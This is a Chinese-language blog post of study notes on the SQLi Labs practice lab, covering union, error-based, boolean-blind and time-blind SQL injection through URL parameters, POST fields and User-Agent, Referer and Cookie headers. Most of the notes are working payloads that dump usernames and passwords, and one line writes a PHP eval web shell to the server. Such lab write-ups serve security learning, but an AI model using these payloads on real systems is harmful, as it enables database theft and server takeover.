---
title: SQLi Labs 注入笔记：联合查询、报错注入与盲注
description: 记录 SQLi Labs 的注入思路与测试过程，涵盖联合查询、报错注入、布尔盲注、时间盲注及 POST、请求头和 Cookie 注入。
date: 2024-10-31
published: 2024-12-10
updated: 2024-12-10
categories:
  - 技术
  - 网络安全
tags:
  - CTF
  - SQL 注入
  - MySQL
  - Web 安全
type: story
image: /article-assets/2024/sqli-labs/images/cover.webp
---

::quote
#icon
[SQLi Labs]{style="color: var(--c-primary)"}
#default
联合查询 · 报错注入 · 盲注
::

![](/article-assets/2024/sqli-labs/images/screenshot-001.webp)
![](/article-assets/2024/sqli-labs/images/screenshot-002.webp)


![](/article-assets/2024/sqli-labs/images/screenshot-003.webp)
![](/article-assets/2024/sqli-labs/images/screenshot-004.webp)

sql 用\判断闭合方式

?id=1' 页面为假      ?id=1'--+      页面为真————》闭合正确

?id=1" 页面为真      ?id=1"--+      页面为真————》闭合错误

排除双引号

?id=1')页面为假      ?id=1'      页面为假

排除单引号加括号')

当显示true 和 false时 使用?id=1'--+不报错

则尝试?id=1' and 1=2--+ 若报错

则尝试?id=1' and 1=1--+此时不报错 则为1'

## less1-4


```sql
?id=2-1
//判断数字型还是字符型

?id=1'--+
//数字型不需要闭合符，字符型需要闭合符。

?id=1'group by 3--+
//查询列数

?id=-1'union select 1,2,3--+
//判断回显，注意?id=-1要为假，否则回显不出

?id=-1'union select 1,2,database()--+
//联合查询数据库

?id=-1' union select 1,2,table_name from information_schema.tables where table_schema='security'--+
//爆表 查询表名  注：information_schema包含数据表tables(表名集合)和columns(列名集合)

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
//group_concat() 是文件展开，使信息放到一行显示 内容展示完全

?id=-1" union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+
//查询列名 列：column

?id=-1' union select 1,2,group_concat(username,password) from users--+
//得到答案
```


?id=-1' union select 1,2,group_concat(id,username,password) from security.users--+

// ' . ' 在其中表示users的上一级security 即users是从属security  -->可加可不加

## less5/6报错注入
database() 可与'security'替换


```sql
?id=1'--+    
//闭合

?id=1' group by 3--+;  
//找列数
?id=1' union select 1,2,extractvalue(1,concat(0x7e,(select database())))--+
//concat(,)是拼接的作用   0x7e即为'~' 上面的1是为了报错而顺带引出正确内容
//select extractvalue(doc./book/autho)from xml;使用extractvalue 查询xml中的内容

?id=1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from  information_schema.tables where table_schema='security')))--+
//
?id=1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name)from  information_schema.columns where table_schema='security' and table_name='users')))--+
//group_concat(table_name)表示将column_name中的内容连接成字符串
//或者将group_concat换成在后面加上limit
?id=1'union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(username,password)from users)))--+
//默认只能返回32个字符串，故应用函数substring
//select substring(123456,1,3)   ---->   此时输出123    ,1表示从第一位输出 ,3表示输出三个
//select substring(123456,4,3)   ---->   此时输出456 
?id=1' union select 1,2,extractvalue (1,concat(0x7e,substring((select group_concat(username,password)from users),1,30)))--+
?id=1' union select 1,2,extractvalue (1,concat(0x7e,substring((select group_concat(username,password)from users),31,30)))--+


//~DumbDumb,AngelinaI-kill you,Du~mmyp@ssword,securecrappy,stupi~dstupidity,supermangenious,bat~manmob!le,adminadmin,admin1admi~n1,admin2admin2,admin3admin3,d~hakkandumbo,admin4admin4 输出结果
```



```sql
//语法：updatexml(目标xml内容，xml文档路径，更新的内容)   --->尽量不使用group_concat()
//updatexml(1,concat(0x7e,(select database()),0x7e),1)             
 //--> ~ 拼接 database()的东西      |>为子查询

?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
//判断库名
?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+
//判断表名
//显示~emails~    依次改为limit1,1   2,1    3,1
?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),0x7e),1)--+
//判断列名
//显示~id~username~password
?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 5,1),0x7e),1)--+
//此时需要limit从0翻到6


?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users limit 0,1),0x7e),1)--+
```


### floor报错
rand()函数：随机返回0\~1的小数

+ select rand()from users;--->返回多少行执行多少次

floor()函数：小数向下取整数。向上取整数ceiling()

+ select floor(rand()*2) from users;----->返回0或1，并执行多行

concat_ws()函数：将括号内数据用第一个字段连接起来

select concat_ws('-',2,3);-----> 回显2-3 若ws()内另有（）则会先执行（）内

+ group by子句：分组语句，常用于 结合统计函数，根据一个或多个列，对结果集进行分组

as：别名

即将所查表名改为a

count()函数：汇总统计数量

limit：用于显示指定行数

eg:

  ?id=0' union select 1,count(*),concat_ws('-',(select concat('\~',id,username,':',password)from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+

#### less-5 floor报错
?id=1'union select 1,count(*),concat_ws('\~',<span style="color: #DF2A3F">(</span>select group_concat(table_name) from information_schema.tables where table_schema=database()<span style="color: #DF2A3F">)</span>, floor(rand(0)*2))as x from information_schema.tables group by x --+

......

?id=1'union select 1,count(*),concat_ws('\~',(select concat(username,password) from users limit 0,1),floor(rand(0)*2))as x from information_schema.tables group by x --+

<span style="color: #DF2A3F">或 </span> ?id=1'union select 1,count(*),concat_ws('\~',(select concat_ws('\~',username,password) from users where id=1),floor(rand(0)*2))as x from information_schema.tables group by x --+


## less7
输入

?id=1'--+回显报错 

输入

?id=1“--+回显不报错    其实质是因为"被()所包围，从而失去“作用 

该题实质为?id=1'))

我们可以通过?id=1" and 1=2 --+来判断


?id=-1')) union select 1,"`<?php @eval($_POST['a']);?>`",3 into outfile "D:\\web\\phpstudy_pro\\WWW\\ben.php" --+

## less8布尔盲注

```sql

```


语序在函数中需要另带括号

ascii(( select 查询语序))  ascii内如果为语序需要将语序再套上层括号  ascii不能把查询内容全部转换 因此需要substring---->不需要另带括号

substring((select查询语序),1,1)

?id=1' and ascii(substring((select database()),1,1))>120--+


?id=1' and ascii(substring((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))>120--+


?id=1' and ascii(substring((select username from users limit 0,1),1,1))>=100--+

     limit表示跳过0行后返回第一行数据            	           substring|->表示从语序     			                              			    结果中的第一位截取一个字符

?id=1' and ascii(substring((select password from users limit 0,1),1,1))>=100--+


## less-9/10时间盲注
判断注入时 可以使用  ?id=1' and sleep(3)--+判断 若停顿三秒则闭合正确

用if(?,true,false) 与三目运算类似  sleep(time)---time为时间 单位为秒   

?id=1' and if(ascii(substring((select database()),1,1))>=100,sleep(0),sleep(3))--+


?id=1' and if(ascii(substring((select table_name from information_schema.tables where table_schema='security'),1,1))>=100,sleep(0),sleep(3))--+


?id=1' and if(ascii(substring((select table_name from information_schema.tables where table_schema='security'limit 0,1),1,1))>=101,sleep(0),sleep(3))--+


?id=1' and if(ascii(substring((select username from users limit 0,1),1,1))>=68,sleep(0),sleep(3))--+

//Dump

?id=1' and if(ascii(substring((select password from users limit 0,1),1,1))>=68,sleep(0),sleep(3))--+

//Dump


## less11-12 POST union注入（以下题为post注入）
注入流程

闭合判断 uname=1' or 1=1#&passwd=admin&Submit=Submit

查询列数uname=1' group by 2 #&passwd=admin&Submit=Submit 

查询库名uname=0' union select 1,(union select database()) #&passwd=admin&submit=Submit

查询security中表名uname=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security') #&passwd=admin&submit=Submit

查询users中列名uname=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')#&passwd=admin&submit=Submit

查询账号密码uname=1' union select 1,(select group_concat(username,password) from users)#&passwd=admin&submit=Submit


## less-14报错注入（“）
1" union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)))# 查询表明

## less-15布尔盲注
uname=' or 1=2# &passwd=admin&submit=Submit  说明第二个也不成立，故在第二个尝试注入

' or ascii(substring((select database()),1,1))>=120# 页面显示成功

' or ascii(substring((select table_name from information_schema.tables where table_schema='security'limit 0,1),1,1))>=101#

' or ascii(substring((select username from users limit 0,1),1,1))>=68#


## less16布尔盲注( ")  )
1") or ascii(substring((select database() limit 0,1),1,1))>=115#

区分报错注入与布尔盲注：

报错注入当闭合正确时有回显报错，

而布尔盲注只有登陆成功/登陆失败两个画面


## less-17报错注入（在password）
当我们在username输入非数据库中用户名时，密码输入什么都会报错。

但当我们输入数据库中包含的用户名时（eg：Dhakkan，admin），密码无论输入什么都不会报错----->说明注入点在password
![](/article-assets/2024/sqli-labs/images/screenshot-005.webp)

可以看到 order by 3    2     1也都是报错，说明这一关就不能使用联合注入了，因为联合注入必须要用 order by 语句去测试有多少列，然后根据列数去写语句，这里显然不能使用联合注入.

extractvalue()版本：

因此 直接报错 uname=admin&passwd=1'  and extractvalue(1,concat(0x7e,(select database())))#&submit=Submit

爆表名

uname=admin&passwd=1'  and extractvalue(1,concat(0x7e,(select  table_name from information_schema.tables where table_schema='security' limit 3,1)))#&submit=Submit

该题不能查username/password，则需查email_id

uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select email_id from security.emails limit 0,1)))#

爆字段名

uname=admin&passwd=1'and extractvalue(1,concat(0x7e,(select column_name from  information_schema.columns where table_schema='security' and table_name='users' limit 0,1)))#&submit=Submit

<strong>获取表数据</strong>：

1'and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))#

<span style="color: #F3BB2F">报错：You can't specify target table 'users' for update in FROM clause</span>  
由于直接查询 `users` 表中的数据会受到限制，你可以使用一个子查询来绕过这个限制。但是，`EXTRACTVALUE()` 通常用于从XML数据中提取值，而不是直接用于查询表数据。因此，你可能需要稍微调整你的方法。然而，在报错注入的上下文中，直接获取表数据通常不是 `EXTRACTVALUE()` 的主要用途。不过，为了演示，你可以尝试以下语句（尽管它可能不会直接工作，因为 `EXTRACTVALUE()` 期望其第一个参数是XML文档）：

' or (select extractvalue(1, concat(0x7e, (select concat_ws(':', username, password) from (select username, password from users) a limit 0,1))))#

但是，请注意，这个语句可能不会按预期工作，因为 `EXTRACTVALUE()` 需要一个XML文档作为输入。在实际情况下，你可能需要找到另一种方法来绕过这个限制，比如使用布尔型盲注或时间型盲注。


以下为updatexml函数例子：

#### 一、分析关卡特点
1. <strong>输入过滤</strong>：用户名（uname）字段可能受到一定的过滤，而密码（passwd）字段则作为潜在的注入点。
2. <strong>两个SQL语句</strong>：关卡中存在两个SQL语句，第一个用于验证用户名是否存在，第二个用于更新密码。注入点可能位于第二个SQL语句中。
3. <strong>无直接回显</strong>：页面没有提供直接的回显位置，因此需要通过报错注入来获取数据库信息。

#### 二、寻找注入点
1. <strong>尝试注入</strong>：在用户名和密码字段中分别尝试使用单引号（'）进行注入，观察页面反应。
2. <strong>确定注入点</strong>：发现密码字段存在注入点，因为当在密码字段中输入单引号时，页面会报错。

#### 三,构造SQL注入语句
1. <strong>使用updatexml()函数</strong>：由于页面没有直接回显，可以利用updatexml()函数的报错机制来获取数据库信息。
2. <strong>构造报错注入语句</strong>：在密码字段中输入类似以下的语句：


```sql
sql复制代码
' OR updatexml(1,concat(0x7e,(select database())),1)#
```


这个语句会触发数据库的错误提示，并返回当前所在的数据库名。

#### 四,获取数据库信息
1. <strong>爆库名</strong>：使用updatexml()函数获取当前数据库名。
2. <strong>爆表名</strong>：通过构造类似的语句来获取指定数据库下的所有表名。


```sql
' OR updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1)#
```


1. <strong>爆字段名</strong>：获取指定表下的所有字段名。


```sql
' OR updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users')),1)#
```


1. <strong>获取表数据</strong>：由于无法直接从users表中查询数据（因为会受到“You can't specify target table 'users' for update in FROM clause”的限制），可以使用一个子查询来绕过这个限制。


```sql
sql复制代码
' OR (updatexml(1,concat(0x7e,(SELECT concat_ws(':',username,password) FROM (SELECT username,password FROM users)a LIMIT 0,1)),1))#
```


通过修改LIMIT子句中的返回行数，可以获取users表中的其他行数据


## less-18(uagent:)

```sql
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```


用burp suite（的user-agent：后面的内容）将  values('  后面部分顶替掉  

即补上    1' or extractvalue(1,concat(0x7e,(select database()))),2,3)#

右键发送repeater 在respoonse中使用render模式 

一,   1' or extractvalue(1,concat(0x7e,(select database()))),2,3)#

二， ' or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'))),2,3)#   注：不能有1

三，' or extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users'))),2,3)#

四，' or extractvalue(1,concat(0x7e,(select group_concat(username,password) from users))),2,3)#


## less-19（referer:）

```sql
$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
```


用burp suite（的referer：后面的内容）将  values('  后面部分顶替掉  

即补上   1' and extractvalue(1,concat(0x7e,(select database()))),   2)#    

<span style="color: #DF2A3F">注意是有两个参数——\$referer,\$IP</span>

一，1' and extractvalue(1,concat(0x7e,(select database()))),  2)#

二，1' and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'))),2)#

三，1' and extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users'))),2)#

四，1' and extractvalue(1,concat(0x7e,(select group_concat(username,password)from users))),2)#


## less-20（cookie）
首先输入admin admin

用burp suite（的Cookie：后面的内容）将  values('  后面部分顶替掉 

'union select 1,2,3 #   <span style="color: #DF2A3F">得知id:1 name:2 password:3 已知name故查password</span>

'union select 1,2,database() #

'union select 1,2, table_name from information_schema.tables where table_schema='security' #

'union select 1,2, group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' #

'union select 1,2, group_concat(username,password) from users #
